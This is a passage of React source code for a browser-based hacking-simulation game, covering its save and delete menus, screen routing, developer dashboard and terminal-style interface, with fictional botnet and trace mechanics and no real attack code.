                          <span style={{ color: COLORS.textDim, fontSize: '10px' }}>{formatTime(info?.timestamp)}</span>
                        </span>
                      </div>
                      {info && (
                        <div style={{ fontSize: '10px', color: COLORS.textDim }}>
                         : <span style={{ color: COLORS.warning }}>₿{info.money.toLocaleString()}</span> │ REP: {info.reputation} │ C2: <span style={{ color: COLORS.infected }}>{info.botnet}</span> │ LOOTED: {info.nodesLooted}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
              <div style={{color: COLORS.textDim, fontSize: '10px', marginTop: '10px'}}>[UP/DOWN] NAVIGATE | [ENTER] LOAD | [ESC] CANCEL</div>
              <button onClick={() => { setMenuMode('main'); setMenuIndex(0); }} style={{
                marginTop: '12px', background: 'transparent', border: `1px solid ${COLORS.border}`, color: COLORS.textDim,
                padding: '10px 20px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '12px', borderRadius: '3px', letterSpacing: '1px', width: '100%',
              }}>← BACK</button>
            </div>
          )}

          {menuMode === 'delete' && !deleteTarget && (
            <div style={{ width: '420px' }}>
              <div style={{ color: COLORS.danger, fontSize: '11px', marginBottom: '12px', letterSpacing: '2px' }}>SELECT SAVE TO DELETE</div>
              <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
                {saves.slice().reverse().map((name, idx) => {
                  const info = getSaveInfo(name); const isAuto = name.startsWith('auto_');
                  const isSelected = menuIndex === idx;
                  return (
                    <div key={name} 
                      onMouseEnter={() => setMenuIndex(idx)}
                      onClick={() => setDeleteTarget(name)}
                      style={{
                        border: `1px solid ${isSelected ? COLORS.danger : COLORS.danger + '30'}`, padding: '12px', marginBottom: '6px',
                        borderRadius: '3px', background: isSelected ? `${COLORS.danger}20` : COLORS.bgPanel, cursor: 'pointer',
                    }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                        <span style={{ color: COLORS.text, fontSize: '12px' }}>
                          {isSelected ? '▸ ' : ''}{isAuto ? '◦ AUTO' : '◉ MANUAL'} — {info?.operator || name}
                        </span>
                        <span style={{ color: COLORS.danger, fontSize: '10px' }}>DELETE</span>
                      </div>
                      {info && (
                        <div style={{ fontSize: '10px', color: COLORS.textDim, marginTop: '4px' }}>
                         : ₿{info.money.toLocaleString()} │ REP: {info.reputation} │ {formatTime(info.timestamp)}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
              <div style={{color: COLORS.textDim, fontSize: '10px', marginTop: '10px'}}>[UP/DOWN] NAVIGATE | [ENTER] SELECT | [ESC] CANCEL</div>
              <button onClick={() => { setMenuMode('main'); setMenuIndex(0); }} style={{
                marginTop: '12px', background: 'transparent', border: `1px solid ${COLORS.border}`, color: COLORS.textDim,
                padding: '10px 20px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '12px', borderRadius: '3px', letterSpacing: '1px', width: '100%',
              }}>← BACK</button>
            </div>
          )}

          {menuMode === 'delete' && deleteTarget && (
            <div style={{ border: `1px solid ${COLORS.danger}`, padding: '24px', background: COLORS.bgPanel, borderRadius: '4px', width: '350px' }}>
              <div style={{ color: COLORS.danger, fontSize: '12px', marginBottom: '16px' }}>PERMANENTLY DELETE SAVE?</div>
              <div style={{ color: COLORS.text, fontSize: '13px', marginBottom: '16px' }}>"{deleteTarget}"</div>
              <div style={{ display: 'flex', gap: '8px', justifyContent: 'center' }}>
                <button 
                  onMouseEnter={() => setMenuIndex(0)}
                  onClick={() => setDeleteTarget(null)} 
                  style={{
                    background: menuIndex === 0 ? `${COLORS.primary}20` : 'transparent', color: menuIndex === 0 ? '#fff' : COLORS.textDim, border: `1px solid ${menuIndex === 0 ? COLORS.primary : COLORS.border}`,
                    padding: '8px 20px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '11px', borderRadius: '3px',
                }}>{menuIndex === 0 ? '▸ ' : ''}CANCEL</button>
                <button 
                  onMouseEnter={() => setMenuIndex(1)}
                  onClick={() => { deleteSave(deleteTarget); setDeleteTarget(null); setMenuIndex(0); }} 
                  style={{
                    background: menuIndex === 1 ? COLORS.danger : `${COLORS.danger}40`, color: '#fff', border: 'none',
                    padding: '8px 20px', cursor: 'pointer', fontFamily: 'inherit', fontSize: '11px',
                    borderRadius: '3px', fontWeight: 'bold',
                }}>{menuIndex === 1 ? '▸ ' : ''}CONFIRM DELETE</button>
              </div>
               <div style={{color: COLORS.textDim, fontSize: '10px', marginTop: '16px'}}>[LEFT/RIGHT] TOGGLE | [ENTER] SELECT | [ESC] CANCEL</div>
            </div>
          )}
        </div>
      </div>
    );
  }

  if (screen === 'hardware') return (
    <UnifiedMarket
      money={money} rig={rig} partsBag={partsBag}
      softwareOwned={softwareOwned}
      marketData={hwMarketData}
      commodityStash={stash}
      currentRegion={currentRegion}
      onBuyHW={handleHwBuy} onSellHW={handleHwSell}
      onInstall={handleHwInstall} onUninstall={handleHwUninstall}
      onBuyAndInstall={handleBuyAndInstall}
      onBuySW={handleBuySW}
      onBuyCommodity={handleBuyCommodity}
      onSellCommodity={handleSellCommodity}
      returnToGame={() => setScreen('game')}
    />
  );

  if (screen === 'shop') return (
    <DarknetShop money={money} reputation={reputation} inventory={inventory} handleBuy={handleBuy} returnToGame={() => setScreen('game')} />
  );

  if (screen === 'market') return (
    <MarketBoard money={money} stash={stash} marketPrices={marketPrices} currentRegion={currentRegion} handleTrade={handleMarketTrade} returnToGame={() => setScreen('game')} />
  );

  if (screen === 'contracts') return (
    <ContractBoard contracts={contracts} activeContract={activeContract} acceptContract={acceptContract} returnToGame={() => setScreen('game')} />
  );
  
  if (screen === 'sounds') return (
    <SoundManager
      returnToGame={() => setScreen('game')}
      onSoundMapChange={setSoundMapState}
    />
  );
  
if (screen === 'soundmanager') {
    return (
      <SoundManager 
        returnToGame={() => setScreen('intro')} 
        onSoundMapChange={(map) => soundEngine.setSoundMap(map)}
      />
    );
  }
  if (screen === 'aisettings') {
  return <AiSettings returnToGame={() => setScreen('intro')} />;
}
  
  return (
    <div onMouseDown={(e) => { if (e.target === e.currentTarget && inputRef.current && !isProcessing && screen === 'game') inputRef.current.focus(); }} style={{
      background: COLORS.bg, color: COLORS.text, position: 'absolute', top: 0, bottom: 0, left: 0, right: 0,
      display: 'flex', flexDirection: 'column', padding: isMobile ? '8px 10px' : '12px 16px', fontFamily: "'Consolas', 'Fira Code', 'JetBrains Mono', monospace",
      overflow: 'hidden', boxSizing: 'border-box', fontSize: '13px'
    }}>
      <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: `repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px)`, pointerEvents: 'none', zIndex: 100 }} />
      <div style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, background: 'radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.4) 100%)', pointerEvents: 'none', zIndex: 99 }} />

      <Header
        operator={operator} currentRegion={currentRegion} privilege={privilege} money={money} heat={heat} reputation={reputation} isInside={isInside} targetIP={targetIP} trace={trace} isChatting={isChatting} activeContract={activeContract} world={world} gameMode={gameMode}
        wantedTier={wantedTier} walletFrozen={walletFrozen}
        onSave={() => { saveGame(operator); setTerminal(prev => [...prev, { type: 'out', text: `[+] Game saved: "${operator}"`, isNew: true }]); }}
        onMenu={() => { if (!isInside) { saveGame(`auto_${operator}`); setScreen('intro'); setMenuMode('main'); setDeleteTarget(null); setMenuIndex(0); } }}
        onHelp={() => setShowHelpMenu(prev => !prev)}
        onSounds={() => setScreen('sounds')}
        isMobile={isMobile}
      />

      {devMode && (
        <div style={{
          position: 'absolute', top: '50px', right: '15px', width: '250px', background: 'rgba(20, 0, 0, 0.9)', border: `1px solid ${COLORS.danger}`,
          padding: '10px', fontSize: '10px', color: COLORS.danger, fontFamily: 'monospace', zIndex: 100, backdropFilter: 'blur(4px)'
        }}>
          <div style={{ fontWeight: 'bold', borderBottom: `1px solid ${COLORS.danger}`, paddingBottom: '4px', marginBottom: '4px' }}>[ DEV DASHBOARD ACTIVE ]</div>
          <div>AI SKILL SCORE: <span style={{color: '#fff'}}>{director.skillScore}</span> (-100 to +100)</div>
          <div>AI TRACE MULTIPLIER: <span style={{color: '#fff'}}>{director.modifiers.traceSpeedMult}x</span></div>
          <div>AI PROXY BONUS: <span style={{color: '#fff'}}>{director.modifiers.proxyCapBonus}</span> slots</div>
          <div style={{marginTop: '4px'}}>ACTUAL MAX PROXIES: <span style={{color: '#fff'}}>{Math.max(1, (inventory.includes('Overclock') ? 3 : 2) + (inventory.includes('TorRelay') ? 1 : 0) + director.modifiers.proxyCapBonus)}</span></div>
          <div>HONEYPOT CHANCE: <span style={{color: '#fff'}}>{Math.floor(director.modifiers.honeypotChance * 100)}%</span></div>
          <div style={{marginTop: '4px', color: '#888'}}>Use 'dev.money', 'dev.item [id]', 'dev.score [num]', 'dev.reveal'</div>
        </div>
      )}

      {showHelpMenu && <HelpPanel onClose={() => setShowHelpMenu(false)} devMode={devMode} COLORS={COLORS} />}

      {!(isMobile && isKeyboardOpen) && (
      <div style={{ display: 'flex', gap: '8px', margin: '6px 0', flexDirection: isMobile ? 'column' : 'row' }}>
        <NetworkMap
          world={world} botnet={botnet} proxies={proxies} looted={looted} targetIP={targetIP} trace={trace} inventory={inventory}
          selectNodeFromMap={selectNodeFromMap} expanded={mapExpanded} toggleExpand={() => setMapExpanded(e => !e)} currentRegion={currentRegion}
          consumables={consumables}
          money={money}
          isMobile={isMobile}
        />
        <RigDisplay 
          rig={rig} // <-- Pass the actual installed hardware
          inventory={inventory} heat={heat} isProcessing={isProcessing} expanded={mapExpanded} toggleExpand={() => setMapExpanded(e => !e)}
          isMobile={isMobile}
        />
      </div>
      )}

      <div style={{ flexGrow: 1, overflowY: 'auto', margin: '4px 0', paddingRight: '8px', fontSize: isMobile ? '13px' : 'inherit', scrollbarWidth: 'thin', scrollbarColor: `${COLORS.border} transparent` }}>
        {terminal.map((t, i) => {
          let inColor = isChatting ? COLORS.chat : (t.remote ? COLORS.primary : COLORS.textDim);
          return (
            <div key={i} style={{ marginBottom: '4px', wordBreak: 'break-all', whiteSpace: 'pre-wrap', background: t.isChat ? `${COLORS.chat}10` : 'transparent', padding: t.isChat ? '2px 6px' : '0', borderRadius: t.isChat ? '3px' : '0', lineHeight: '1.5' }}>
      {t.type === 'in' ? ( 
        <span style={{ color: inColor }}>
          <span style={{ color: COLORS.textDim }}>{t.dir}</span> <span style={{ color: COLORS.secondary }}>$</span> {t.text}
        </span> 
      ) : (
        t.isNew ? ( 
         <Typewriter 
  text={t.text} 
  scrollRef={terminalEndRef} 
  onComplete={() => { 
    t.isNew = false; 
    // This is the safety net focus call
    inputRef.current?.focus(); 
  }} 
  customColor={t.isChat ? COLORS.chat : undefined} 
/>
        ) : ( 
          <span style={{ color: t.isChat ? COLORS.chat : undefined }}>
            <SyntaxText text={t.text} />
          </span> 
        )
      )}
    </div>
          );
        })}
        <div ref={terminalEndRef} style={{ height: '8px' }} />
      </div>

      {isMobile && (
        <MobileTouchUI
          world={world}
          currentRegion={currentRegion}
          isInside={isInside}
          privilege={privilege}
          targetIP={targetIP}
          currentDir={currentDir}
          isChatting={isChatting}
          chatTarget={chatTarget}
          botnet={botnet}
          proxies={proxies}
          inventory={inventory}
          heat={heat}
          trace={trace}
          mapExpanded={mapExpanded}
          consumables={consumables}
          gameMode={gameMode}
          onCommand={executeQuickCommand}
          onToggleKeyboard={() => { setShowMobileKeyboard(k => !k); setTimeout(() => inputRef.current?.focus(), 100); }}
          onToggleMap={() => setMapExpanded(e => !e)}
          onFillInput={(text) => { setInput(text); setShowMobileKeyboard(true); setTimeout(() => inputRef.current?.focus(), 100); }}
          externalSelectedIP={mobileSelectedTarget}
          clearExternalSelection={() => setMobileSelectedTarget(null)}
        />
      )}

      {(!isMobile || showMobileKeyboard) && (
      <div onClick={() => { if (inputRef.current) inputRef.current.focus(); }} style={{ flexShrink: 0, display: 'flex', alignItems: 'center', borderTop: `1px solid ${trace > 75 ? COLORS.danger + '60' : COLORS.border}`, paddingTop: '8px', background: trace > 75 ? `${COLORS.danger}08` : 'transparent', cursor: 'text' }}>
        <span style={{ color: isChatting ? COLORS.chat : (isInside ? COLORS.primary : COLORS.textDim), opacity: isProcessing ? 0.4 : 1, whiteSpace: 'nowrap', fontSize: '12px' }}>
          {isChatting ? `chat@${chatTarget} ` : `${currentDir} `} <span style={{ color: COLORS.secondary }}>$</span>
        </span>
        <input
          ref={inputRef} disabled={isProcessing}
          style={{ background: 'transparent', border: 'none', color: isChatting ? COLORS.chat : (isInside ? COLORS.primary : COLORS.text), outline: 'none', flex: 1, fontFamily: 'inherit', paddingLeft: '8px', fontSize: '13px', opacity: isProcessing ? 0.4 : 1 }}
          value={isProcessing ? "PROCESSING..." : input} onChange={e => setInput(e.target.value)} onKeyDown={handleCommand} autoFocus={!isMobile} autoComplete="off" spellCheck="false"
        />
      </div>
      )}
    </div>
  );
};
export default STEAMBREACH;
